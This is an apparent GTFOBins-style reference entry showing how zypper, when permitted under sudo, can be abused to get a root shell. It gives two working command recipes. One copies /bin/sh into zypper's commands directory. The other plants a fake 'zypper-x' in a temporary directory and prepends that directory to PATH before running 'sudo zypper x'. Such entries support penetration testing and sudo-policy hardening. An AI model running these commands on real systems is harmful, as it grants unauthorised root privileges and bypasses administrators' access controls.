***** Sudo *****
If the binary is allowed to run as superuser by sudo, it does not drop the
elevated privileges and may be used to access the file system, escalate or
maintain privileged access.
    * This requires /bin/sh to be copied to /usr/lib/zypper/commands/zypper-
      x and this usually requires elevated privileges.
      sudo zypper x
    * TF=$(mktemp -d)
      cp /bin/sh $TF/zypper-x
      sudo PATH=$TF:$PATH zypper x
